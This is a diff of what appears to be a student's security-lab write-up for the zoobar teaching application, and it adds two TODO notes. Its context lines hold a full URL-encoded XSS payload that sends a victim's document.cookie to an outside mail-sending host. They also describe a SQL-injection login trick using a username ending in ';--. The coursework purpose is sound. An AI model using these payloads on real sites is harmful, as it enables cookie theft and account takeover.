@@ -29,6 +29,8 @@ Full URL:
 `http://zoobar.org/users.php?user=%5C%22%20size%3D10%5C%3E%5C%3Cscript%5C%3E%28new%20Image%28%29%29.src%3D%27http%3A%2F%2Fzoomail.org%2Fsendmail.php%3F%27%2B%27%26netid%3Dedydfang%27%2B%27%26payload%3D%27%2Bdocument.cookie%2B%27%26random%3D%27%2BMath.random%28%29%3B%5C%3C%2Fscript%5C%3E%5C%3Cinput%20type%3D%5C%22hidden`
 
 
+### TODO
+- Add redirection after loading to remove red message on the webpage
 
 ## B: XSS Attack
 
@@ -77,3 +79,6 @@ In the above function `_checkLogin`, we can notice that the code will first chec
  I used the similar XSS of the Part B. The only difference is the post URL and the data we are sending. Also, for this attack, we need to send two package, one for registration and another for login.
 
 For the username manipulation, we can simply append `';--` , making the SQL terminate and let the rest of the text be the comment. For example, when we want to login to the user account `attacker`, we will first register the account `attacker';--` and then we use this username again and a arbitrary password to login. The account we login will be `attack`.
+
+### TODO
+- Add redirection after logging in
